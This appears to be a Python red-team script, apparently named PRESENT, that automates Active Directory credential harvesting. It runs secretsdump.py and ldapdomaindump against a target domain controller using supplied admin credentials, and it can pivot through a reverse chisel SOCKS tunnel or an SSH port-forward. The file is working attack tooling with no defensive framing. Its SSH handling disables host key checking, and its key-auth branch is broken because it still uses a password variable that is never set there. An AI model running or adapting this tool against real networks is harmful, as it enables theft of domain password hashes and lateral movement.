import subprocess
import os
import questionary
from questionary import Style, select

# Global dictionary for shared variables
shared_variables = {}

# Global flag to track if SOCKS Proxy was selected
use_socks_proxy = False

def tunneltype(target, ssh_target_port):
    global use_socks_proxy

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()

    if proxy_question == "n":
        print("\033[32m[+] No tunneling required. Proceeding...\033[0m")
        return "NO_TUNNEL"

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port (default: 1080): ") or "1080"
                command = f"chisel client {socks_ip}:{socks_port} R:socks &"
                try:
                    print("Connecting to Chisel server...")
                    subprocess.run(command, shell=True, check=True)
                    print("\033[32m[+] Successfully connected to Chisel server for redirection.\033[0m")
                    use_socks_proxy = True
                    return "SOCKS Proxy"
                except subprocess.CalledProcessError as e:
                    print(f"\033[31m[-] Failed to connect to Chisel server. Error:\033[0m {e.stderr}")
                    return None

            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel IP SSH Port (default: 22): ").strip() or "22"
                ssh_tunnel_user = input("Enter SSH Username for the Tunnel Box: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()

                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    ssh_command_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("\033[31m[-] No valid SSH key selected. Exiting.\033[0m")
                        return None
                    ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

                # Construct the SSH command
                command = (
                    f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                    f"-N -f -L 127.0.0.1:2222:{target}:{ssh_target_port} "
                    f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port}"
                )

                try:
                    print(f"Running SSH Tunnel Command: {command}")
                    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                    if result.returncode == 0:
                        print("\033[32m[+] Successfully set up SSH tunnel.\033[0m")
                        return "SSH Tunnel"
                    else:
                        print("\033[31m[-] SSH tunnel setup failed.\033[0m")
                        print(f"Error: {result.stderr}")
                        return None
                except Exception as e:
                    print(f"\033[31m[-] Failed to set up SSH tunnel. Exception:\033[0m {str(e)}")
                    return None

            case "TCP Tunnel":
                print("\033[31m[-] TCP Tunnel is not implemented.\033[0m")
                return None

            case "Exit":
                print("\033[31m[-] Exiting tunnel setup.\033[0m")
                return None

    return None


def creds():
    global shared_variables
    print("\033[94mModule Selected: Domain Credentials Dump\033[0m")
    shared_variables["domain"] = input("Enter Target Domain (Ex: steel.arizona.tu): ")
    shared_variables["username"] = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
    shared_variables["password"] = input("Enter High Privileged LDAP User's Password: ")
    shared_variables["target"] = input("Enter Target IP: ")
    shared_variables["ssh_target_port"] = input("Enter Target Box's Port: ")

    tunnel_result = tunneltype(shared_variables["target"], shared_variables["ssh_target_port"])

    if tunnel_result == "SOCKS Proxy":
        command = [
            "python",
            "/usr/local/bin/secretsdump.py",
            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
            "-outputfile",
            "secretsdump_output.txt"
        ]
    elif tunnel_result == "SSH Tunnel":
        command = [
            "python",
            "/usr/local/bin/secretsdump.py",
            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
            "-outputfile",
            "secretsdump_output.txt"
        ]
    elif tunnel_result == "NO_TUNNEL":
        command = [
            "python",
            "/usr/local/bin/secretsdump.py",
            f"{shared_variables['domain']}/{shared_variables['username']}:{shared_variables['password']}@{shared_variables['target']}",
            "-outputfile",
            "secretsdump_output.txt"
        ]
    else:
        print("\033[31m[-] Tunnel setup failed. Exiting credentials module.\033[0m")
        return

    print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print("\033[32m[+] Secretsdump completed successfully.\033[0m")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(e.stderr)


def ldap():
    global shared_variables

    print("\033[94mModule Selected: Full LDAP Domain Dump\033[0m")
    shared_variables["domain"] = input("Enter Target Domain (Ex: steel.arizona.tu): ")
    shared_variables["username"] = input("Enter High Privilege LDAP Username (Ex: Administrator): ")
    shared_variables["password"] = input("Enter High Privileged LDAP User's Password: ")
    shared_variables["target"] = input("Enter Target IP: ")
    shared_variables["ssh_target_port"] = input("Enter Target Box's Port: ")

    tunnel_result = tunneltype(shared_variables["target"], shared_variables["ssh_target_port"])

    if tunnel_result == "SOCKS Proxy":
        print("\033[32m[+] SOCKS Proxy setup succeeded. Proceeding with LDAP dump...\033[0m")
        command = [
            "ldapdomaindump",
            shared_variables["target"],
            "-u",
            f"{shared_variables['domain']}\\{shared_variables['username']}",
            "-p",
            shared_variables["password"],
            "--no-json",
            "--no-grep"
        ]
    elif tunnel_result == "SSH Tunnel":
        print("\033[32m[+] SSH Tunnel setup succeeded. Proceeding with LDAP dump...\033[0m")
        command = [
            "ldapdomaindump",
            "127.0.0.1:2222",
            "-u",
            f"'{shared_variables['domain']}\\{shared_variables['username']}'",
            "-p",
            f"'{shared_variables['password']}'",
            "--no-json",
            "--no-grep"
        ]
    elif tunnel_result == "NO_TUNNEL":
        print("\033[32m[+] No tunneling required. Proceeding with LDAP dump...\033[0m")
        command = [
            "ldapdomaindump",
            shared_variables["target"],
            "-u",
            f"{shared_variables['domain']}\\{shared_variables['username']}",
            "-p",
            shared_variables["password"],
            "--no-json",
            "--no-grep"
        ]
    else:
        print("\033[31m[-] Tunnel setup failed. Exiting LDAP module.\033[0m")
        return

    print("\033[33m[!] Command to be executed:\033[0m", " ".join(command))
    try:
        print("\033[32m[+] Running LDAP domain dump...\033[0m")
        result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print("\033[32m[+] LDAP domain dump completed successfully.\033[0m")
        print("\033[32m[+] Command Output:\033[0m")
        print(result.stdout)

        if result.stderr:
            print("\033[33m[!] Command Warnings or Errors:\033[0m")
            print(result.stderr)
    except subprocess.CalledProcessError as e:
        print(e.stderr)


# Define custom style
custom_style = Style([("choice", "fg:blue")])

ascii_art = r"""
+-----------------------------------------------------------------------------+
|                                                                             |
|   _______________________________ ____________________ ___________________  |
|   \______   \______   \_   _____//   _____/\_   _____/ \      \__    ___/   |
|    |     ___/|       _/|    __)_ \_____  \  |    __)_  /   |   \|    |      |
|    |    |    |    |   \|        \/        \ |        \/    |    \    |      |
|    |____|    |____|_  /_______  /_______  //_______  /\____|__  /____|      |
|                     \/        \/        \/         \/         \/            |
|                                                                             |
+-----------------------------------------------------------------------------+
"""

print(f"\033[35m{ascii_art}\033[0m")

choice = select(
    "What do you wish to collect:",
    choices=["Credentials", "LDAP", "Exit"],
    style=custom_style
).ask()

if choice == "Credentials":
    creds()
elif choice == "LDAP":
    ldap()
elif choice == "Exit":
    print("Exiting the program. Goodbye!")
